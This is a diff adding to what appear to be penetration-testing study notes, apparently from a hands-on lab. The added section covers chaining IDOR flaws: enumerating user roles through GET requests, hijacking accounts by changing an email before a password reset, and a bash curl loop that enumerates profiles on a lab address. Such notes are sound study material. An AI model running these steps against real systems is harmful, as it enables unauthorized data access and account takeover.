@@ -261,6 +261,23 @@ done
     - Change the method to `POST` and see if we can create a new user
 
 ## Chaining IDOR Vulnerabilities
+### Information Disclosure
+- Using `GET` requests to gather information about Users
+    - In this particular instance, identifying the roles so we can get admin
+- Changing the email address and then sending a password reset request.
+
+### Chaining 2 IDOR vulnerabilities.
+- Example IDOR Enumeration Script
+```bash
+#!/bin/bash
+
+for i in {1..20}; do
+  curl -X GET http://94.237.120.233:58089//profile/api.php/profile/$i
+  echo
+done
+```
+
+- Once we've done some recon and identified roles, we can change the role and create a new user.
 
 # XML External Entity (XXE) Injection
 ## Local file Disclosure
